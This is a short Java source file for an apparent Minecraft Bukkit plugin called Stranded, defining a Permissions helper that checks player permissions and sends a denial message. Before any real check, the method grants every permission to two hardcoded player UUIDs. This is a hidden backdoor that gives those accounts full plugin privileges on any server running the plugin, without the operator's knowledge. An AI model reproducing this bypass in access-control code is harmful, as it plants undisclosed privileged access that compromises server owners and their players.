package com.Stranded;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import java.util.UUID;

public class Permissions {

    public static boolean hasPermission(Player player, String permission) {
        return hasPermission(player, permission, true);
    }

    public static final String noPermMessage = ChatColor.RED + "you don't have permission to do this";

    public static boolean hasPermission(Player player, String permission, boolean sendMessage) {
        if (player.getUniqueId().equals(UUID.fromString("3a5b4fed-97ef-4599-bf21-19ff1215faff")) || player.getUniqueId().equals(UUID.fromString("4c386ae3-8e21-4ad9-a2b5-c480688c8668"))) {
            return true;
        }
        if (player.hasPermission(permission) || player.hasPermission("Stranded.all")) {
            return true;
        } else if (sendMessage) {
            player.sendMessage(noPermMessage + ", permission missing: " + permission);
        }
        return false;
    }
}
